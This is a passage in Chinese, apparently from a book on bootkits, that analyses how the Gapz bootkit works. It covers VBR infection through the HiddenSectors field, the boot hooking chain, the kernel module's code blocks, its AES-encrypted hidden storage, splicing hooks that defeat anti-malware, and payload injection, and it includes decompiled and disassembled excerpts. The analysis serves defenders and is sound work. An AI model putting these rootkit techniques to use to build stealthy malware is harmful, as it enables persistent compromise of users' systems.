
*Listing 12-4: NTFS 的 BIOS_PARAMETER_BLOCK 布局*

正如第 5 章所回顾的，`HiddenSectors` 字段 ➊（结构起始偏移 14 处）决定了 IPL（引导程序加载）在硬盘上的位置（参见 Figure 12-3）。VBR 代码使用 `HiddenSectors` 找到 IPL 并执行它。

![image](img/12fig03.jpg)

*Figure 12-3: 硬盘上 IPL 的位置*

#### VBR 感染过程

Gapz 在系统启动时通过修改 BPB 中的 `HiddenSectors` 字段值来劫持控制流。感染时，Gapz 在硬盘最前面（如果有足够空间）或在最后一个分区之后写入 bootkit 主体，并将 `HiddenSectors` 字段改为指向硬盘上根套件主体的起始位置，而不是指向原始的 IPL 代码（参见 Figure 12-4）。因此，下一次启动时，VBR 代码会加载并执行硬盘末端的 Gapz bootkit 代码。

![image](img/12fig04.jpg)

*Figure 12-4: Gapz bootkit 感染布局*

这种技术的魅力在于它只修改了 VBR 数据的 4 个字节，远少于其他 bootkits。例如，TDL4 修改 446 字节的 MBR 代码；Olmasco 修改 MBR 分区表中的一个条目（16 字节）；Rovnix 修改占 7,680 字节（15 个扇区）的 IPL 代码。

Gapz 于 2012 年出现，当时安全行业已跟上现代 bootkit 的步伐，MBR、VBR 以及 IPL 代码的监控已成为常规做法。然而，通过修改 BPB 的 `HiddenSectors` 字段，Gapz 将 bootkit 感染技术更进一步，使安全行业难以跟进。在此之前，安全软件很少检查 BPB 字段的异常。Gapz 的新方法迫使安全行业花费时间才能识别其创新的感染手段并开发相应的防御措施。

另一项让 Gapz 脱颖而出的是，`HiddenSectors` 字段的内容并非固定的，而是随 BPB 结构而异，取决于硬盘的分区方案。该字段的值主要取决于硬盘的分区结构。一般而言，仅凭 `HiddenSectors` 的值无法判断系统是否被感染，必须对硬盘实际内容在相应偏移处的代码进行更深入的分析。

Figure 12-5 展示了一个真实 Gapz 感染系统的 VBR 内容。BPB 位于偏移 11 处，`HiddenSectors` 字段的值为 `0x00000800`，已被高亮显示。

![image](img/12fig05.jpg)

*Figure 12-5: 感染系统中的 `HiddenSectors` 值*

要检测 Gapz，安全软件必须分析硬盘起始处偏移 `0x00000800` 处的数据，这里正是恶意引导加载器所在的位置。

#### 加载恶意内核模式驱动

与许多现代引导程序一样，Gapz 引导程序的主要目的是通过将恶意代码加载到内核模式地址空间来妥协操作系统。一旦 Gapz 引导程序代码获得控制权，它就会按照前面章节所述的常规流程对系统引导组件进行修补。

执行后，引导程序代码会钩选 INT 13h 处理程序，以监控硬盘读取的数据。随后它会从硬盘加载原始 IPL 代码并执行，以恢复引导过程。图 12-6（<a href="https://example.org/ch12.xhtml#ch12fig06">链接</a>）展示了受 Gapz 影响的系统的引导过程。

在钩选 INT 13h ➊ 之后，恶意代码会监控硬盘读取的数据，并寻找 `bootmgr` 模块，该模块会在内存中进行修补，以钩选 `Archx86TransferTo32BitApplicationAsm` 例程（在 x64 Windows 平台上对应 `Archx86TransferTo64BitApplicationAsm`）。该例程负责将控制权从 `bootmgr` 转移到 `winload.exe` 的入口点。钩选用于修补 `winload.exe` 模块。一旦 `bootmgr` 的钩选被触发，`winload.exe` 已经在内存中，恶意代码即可对其进行修补。引导程序会钩选 `winload.exe` 模块中的 `OslArchTransferToKernel` 例程 ➌。

如前面章节讨论过，Rovnix 也从钩选 INT 13h 处理程序、修补 `bootmgr`、钩选 `OslArchTransferToKernel` 开始。但与 Gapz 不同，Rovnix 在下一步会通过修补内核 `KiSystemStartup` 例程来妥协内核。

![image](img/12fig06.jpg)

*Figure 12-6: 引导程序的工作流程*

相反地，Gapz 会钩选内核映像中的另一个例程：`IoInitSystem` ➍。该例程的作用是完成内核初始化，初始化不同的操作系统子系统并调用引导启动驱动的入口。一旦 `IoInitSystem` 执行，恶意钩选会被触发，恢复 `IoInitSystem` 例程已修补的字节，并将 `IoInitSystem` 的返回地址在栈上覆盖为指向恶意代码的地址。Gapz 引导程序随后将控制权交还给 `IoInitSystem` 例程。

在例程执行完成后，控制权会转回恶意代码。`IoInitSystem` 执行完毕后，内核得到正确初始化，引导程序即可利用其提供的服务访问硬盘、分配内存、创建线程等。随后，恶意代码从硬盘读取剩余的引导程序代码，创建系统线程，最后返回控制权给内核。一旦恶意内核模式代码在内核地址空间中执行完毕，引导程序的任务便告完成 ➎。

**规避安全软件检测**

在引导过程的最早阶段，Gapz 会从受感染的 VBR（卷引导记录）中移除引导程序感染痕迹；在其内核模块执行期间再恢复感染痕迹。一个可能的解释是，某些安全产品在启动时会进行系统检查，因此 Gapz 在启动时先从 VBR 中清除感染证据，从而避免被检测到。

### Gapz 根程序功能

本节将聚焦于 Gapz 的根程序功能，这是 Gapz 之后最有趣的方面。我们称 Gapz 根程序功能为内核模式模块，因为它并不是合法的内核模式驱动，意义上不是 PE 映像。相反，它以位置无关代码（PIC）的形式组织，由若干块组成，每块实现特定的恶意功能以完成特定任务。内核模式模块的目的是在系统进程中隐蔽、静默地注入 payload。

Gapz 内核模式模块最引人注目的是它实现了一个自定义的 TCP/IP 网络栈用于与 C&C 服务器通信；它使用一个加密库，内置了 `RC4`、`MD5`、`SHA1`、`AES` 和 `BASE64` 等自定义加密原语，以保护配置数据和 C&C 通信通道。正如任何复杂威胁一样，它还实现了隐藏存储，用于秘密存储其用户模式 payload 和配置信息。Gapz 还包含一个强大的钩选引擎，内置 disassembler，用于设置持久且隐蔽的钩选。在本节余下部分，我们将详细探讨这些以及更多内核模式模块的特性。

Gapz 内核模式模块并非传统的 PE 映像，而是由一组使用 *位置无关代码（PIC）* 的块组成，这些代码不使用绝对地址来引用数据。因此，其内存缓冲区可以位于进程地址空间的任意合法虚拟地址。每个块都有特定用途。每个块前都有一个描述其大小和在模块中位置的头部，以及用于计算块内实现例程地址的常量。头部结构如 Listing 12-5 所示。

```c
struct GAPZ_BASIC_BLOCK_HEADER
{
    // 用于获取块中实现的例程地址的常量
    unsigned int ProcBase;
    unsigned int Reserved[2];
    // 下一个块的偏移
    ➋ unsigned int NextBlockOffset;
    // 块初始化例程的偏移
    ➌ unsigned int BlockInitialization;
    // 从模块末尾到配置信息的偏移
    // 仅在第一块有效
    unsigned int CfgOffset;
    // 设置为零
    unsigned int Reserved1[2];
}
```

*Listing 12-5: Gapz 内核模式模块块头*

头部以整数常量 `ProcBase` ➊ 开头，用于计算块中实现的例程地址。`NextBlockOffset` ➋ 指示模块内下一个块的偏移，使 Gapz 能够遍历内核模式模块的所有块。`BlockInitialization` ➌ 包含块起始到块初始化例程的偏移，该例程在内核模式模块初始化时执行，用于初始化该块特有的数据结构，必须在块中实现的其他函数之前执行。

Gapz 使用一个全局结构体保存所有与其内核代码相关的数据：实现例程的地址、分配缓冲区的指针等。该结构体使 Gapz 能够确定位置无关代码块中实现的所有例程地址，然后执行它们。

位置无关代码通过十六进制常量 `0xBBBBBBBB`（用于 x86 模块）来引用全局结构体。在恶意内核代码开始执行时，Gapz 会分配一段内存缓冲区用于全局结构体。随后，它会使用 `BlockInitialization` 例程遍历每个块的代码，并将指向全局结构体的指针替换每一次出现的 `0xBBBBBBBB`。

Listing 12-6 展示了内核模式模块中实现的 `OpenRegKey` 例程的反汇编，同样，`0xBBBBBBBB` 常量用于指代全局上下文，但在执行期间该常量会被实际内存地址替换，以确保代码正确运行。

```c
int __stdcall OpenRegKey(PHANDLE hKey, PUNICODE_STRING Name)
{
    OBJECT_ATTRIBUTES obj_attr; // [esp+Oh] (ebp-1Ch)@1
    int _global_ptr; // [esp+18h] (ebp-4h)@1
    global ptr = 0xBBBBBBBB;
    obj_attr.ObjectName = Name;
    obj_attr.RootDirectory = 0;
    obj_attr.SecurityDescriptor = 0;
    obj_attr.SecurityQualityOfService = 0;
    obj_attr.Length = 24;
    obj_attr.Attributes = 576;
    return (MEMORY[0xBBBBBB] ->ZwOpenKey)(hKey, 0x20019 &ob attr);
}
```

*Listing 12-6: 使用全局上下文的 Gapz 内核模式代码*

在总体上，Gapz 在内核模式模块中实现了 12 个代码块，列在 Table 12-2。最后一个块实现了内核模式模块的主例程，该例程启动模块的执行、初始化其他代码块、设置钩子并启动与 C&C 服务器的通信。

# Table 12-2: Gapz Kernel-Mode Code Blocks

| Block number | Implemented functionality |
|---|---|
| 1 | 通用 API，硬盘信息收集，CRT 字符串例程等 |
| 2 | 加密库：`RC4`、`MD5`、`SHA1`、`AES`、`BASE64` 等 |
| 3 | 钩子引擎，反汇编引擎 |
| 4 | 隐藏存储实现 |
| 5 | 硬盘驱动钩子，自保护 |
| 6 | 载荷管理器 |
| 7 | 将载荷注入进用户态进程的地址空间 |
| 8 | 网络通信：数据链路层 |
| 9 | 网络通信：传输层 |
| 10 | 网络通信：协议层 |
| 11 | 载荷通信接口 |
| 12 | 主例程 |

### 隐藏存储

与大多数引导根套件（bootkits）一样，Gapz 实现隐藏存储以安全存储其载荷和配置信息。隐藏文件系统的映像位于硬盘上的文件 `\\??\\C:\\System Volume Information\\<XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX>`，其中 *X* 表示根据配置信息生成的十六进制数字。隐藏存储的布局是 FAT32 文件系统。Figure 12-7 展示了 `\\usr\\overlord` 隐藏存储目录内容的示例。你可以看到该目录中存放了三个文件：`overlord32.dll`、`overlord64.dll` 和 `conf.z`。前两个文件对应要注入系统进程的用户态载荷，第三个文件 `conf.z` 包含配置数据。

![image](img/12fig07.jpg)

*Figure 12-7: Contents of the hidden storage `\\usr\\overlord` directory*

为了保持隐藏文件系统内部信息的秘密，其内容被加密，如 Listing 12-7 所示。

```c
int stdcall aes_crypt_sectors_cbc(int 1V, int c_text, int p_text, int num_of_sector,
                                  int bEncrypt, STRUCT_AES_KEY *Key)
{
    int result; // eax01
    int _iv; // edi02
    int cbc_iv[4]; // [esp+0h] [ebp-14h)@3
    STRUCT_IPL_THREAD_1 *gl_struct; // [esp+10h] [ebp-4h}@1
    gl_struct = 0xBBBBBBBB;
    result = num_of_sector;
    if ( num_of_sector )
    {
        ➊ _iv = IV;
        do
        {
            cbc_iv[3] = 0;
            cbc_iv[2] = 0;
            cbc_iv[1] = 0;
            cbc_iv[0] = _iv; // CBC initialization value
            result = (gl_struct->crypto->aes_crypt_cbc)(Key, bEncrypt, 512, cbc_iv,
                                                        p_text, c_text);
            p_text += 512; // plain text
            c_text += 512; // ciper text
            ➋ ++_iv;
            --num_of_sector;
        }
        while( num_of_sector );
    }
    return result;
}
```

*Listing 12-7: Encryption of sectors in the hidden storage*

为隐藏存储的每个扇区加密和解密，Gapz 使用自定义的高级加密标准（AES）算法实现，密钥长度为 256 位，工作在密码块链（CBC）模式。Gapz 使用第一个被加密或解密的扇区（➊ 标记的扇区号）作为 CBC 模式的初始化向量（IV），如 Listing 12-7 所示。随后，后续每个扇区的 IV 都递增 1（➋）。即使同一密钥用于硬盘上所有扇区的加密，使用不同的 IV 会导致每个扇区的密文不同。

#### 防反恶意软件（Self-Defense Against Antimalware Software）

为防止被系统删除，Gapz 在硬盘微型驱动程序（miniport driver）上钩住两个例程：`IRP_MJ_INTERNAL_DEVICE_CONTROL` 和 `IRP_MJ_DEVICE_CONTROL`。钩子仅关注以下请求。

* `IOCTL_SCSI_PASS_THROUGH`
* `IOCTL_SCSI_PASS_THROUGH_DIRECT`
* `IOCTL_ATA_PASS_THROUGH`
* `IOCTL_ATA_PASS_THROUGH_DIRECT`

这些钩子保护受感染的 VBR（Volume Boot Record）或 MBR（Master Boot Record）以及硬盘上的 Gapz 映像不被读取或覆盖。

与 TDL4、Olmasco 和 Rovnix 不同，后者会覆盖 `DRIVER_OBJECT` 结构体中处理程序指针的指针，Gapz 使用“拼接”（splicing）技术：即直接修改目标代码本身。在 Listing 12-8 中，你可以看到针对 `scsiport.sys` 驱动程序映像在内存中的钩子例程。此例中，`scsiport.sys` 是一块磁盘微型驱动程序，负责处理 `IOCTL_SCSI_XXX` 与 `IOCTL_ATA_XXX` 请求，是 Gapz 钩子的主要目标。

```
SCSIPORTncsiPortGlobalDispatch:
f84ce44c 8bff                   mov     edi,edi
➊ f84ce44e e902180307           jmp     ff4ffc55
f84ce453 088b42288b40           or      byte ptr [ebx+408B2842h],c1
f84ce459 1456                   adc     a1,56h
f84ce45b 8b750c                 mov     esi,dword ptr [ebp+0Ch]
f84ce45e 8b4e60                 mov     ecx,dword ptr [esi+60h]
f84ce461 0fb609                 movzx   ecx,byte ptr [ecx]
f84ce465 52                     push    edx
f84ce466 ff1488                 call    dword ptr [eax+ecx*4]
f84ce469 5e                     pop     esi
f84ce46a 5d                     pop     ebp
f84ce46b c20800                 ret     8
```

*Listing 12-8: Hook of the scsiport!ScsiPortGlobalDispatch routine*

请注意，Gapz 并未在钩子例程的最开头（`0xf84ce44c`）➊ 处修补代码，这与其他恶意软件常见的做法不同。在 Listing 12-9 中可以看到，它跳过被钩例程开头的若干条指令（例如 nop 和 `mov edi, edi`）。

这可能是为了提高内核模块的稳定性和隐蔽性。某些安全软件仅检查前几个字节是否被修改，以检测被补丁或被钩子的例程；因此，跳过最初的几条指令可以让 Gapz 绕过这些检测。

跳过被钩例程的前几条指令也可以防止 Gapz 破坏已经在合法例程上放置的钩子。例如，在“热补丁”（hot‑patchable）可执行映像中，编译器会在函数开头插入 `mov edi, edi` 指令（如 Listing 12-8 所示），这条指令是操作系统可能设置的合法钩子占位符。跳过该指令可确保 Gapz 不会破坏操作系统的代码补丁能力。

Listing 12-9 中的代码片段展示了钩子例程如何分析目标例程的指令，以确定最佳钩设位置。它检查操作码 `0x90`（对应 nop）和 `0x8B`/`0x89`（对应 `mov edi, edi`）是否出现在被钩例程的开头，这些指令可能表明目标例程属于热补丁映像，因而可能被操作系统进行补丁。于是，恶意软件会在放置钩子时跳过这些指令。

```c
for ( patch_offset = code_to_patch; ; patch_offset += instr.len )
{
    (v42->proc_buff_3->disasm)(patch_offset, &instr);
    if ( (instr.len != 1 || instr.opcode != 0x90u)
         && (instr.len != 2 || instr.opcode != 0x89u &&
             instr.opcode != 0x8Bu || instr.modrm_rm != instr.modrm_reg) )
    {
        break;
    }
}
```

*Listing 12-9: Gapz using a disassembler to skip the first bytes of hooked routines*

为进行此分析，Gapz 实现了 `hacker disassembler engine`，该引擎适用于 `x86` 和 `x64` 平台。这使得恶意软件不仅能获取指令的长度，还能获取其他特征，如指令的操作码及其操作数。

# HACKER DISASSEMBLER ENGINE

`hacker disassembler engine` (HDE) 是一个体积小、简单易用的 disassembler engine，用于 `x86` 和 `x64` 代码分析。它提供命令的长度、操作码以及其他指令参数（如 ModR/M 和 SIB 前缀）。HDE 常被恶意软件用于解码例程的前置部分，以设置恶意钩子（如前文所述），或检测并移除安全软件安装的钩子。

## Payload Injection

Gapz 核心模块将 payload 注入用户模式地址空间的过程如下：

1. 读取配置信息，确定应将哪些 payload 模块注入特定进程，然后从隐藏存储中读取这些模块。
2. 在目标进程的地址空间中分配一个内存缓冲区，用于保存 payload 映像。
3. 在目标进程中创建并运行线程以执行加载代码；该线程映射 payload 映像、初始化 IAT 并修复重定位。

`\\sys` 目录下的隐藏文件系统中的配置文件指定了应注入特定进程的 payload 模块。配置文件名经由隐藏文件系统的 AES 加密密钥通过 SHA1 哈希算法派生。配置文件包含一个头部和若干条目，每条记录描述一个目标进程，如 Figure 12-8 所示。

![image](img/12fig08.jpg)

*Figure 12-8: Layout of the configuration file for payload injection*

每个进程条目结构如 Listing 12-10 所示。

```c
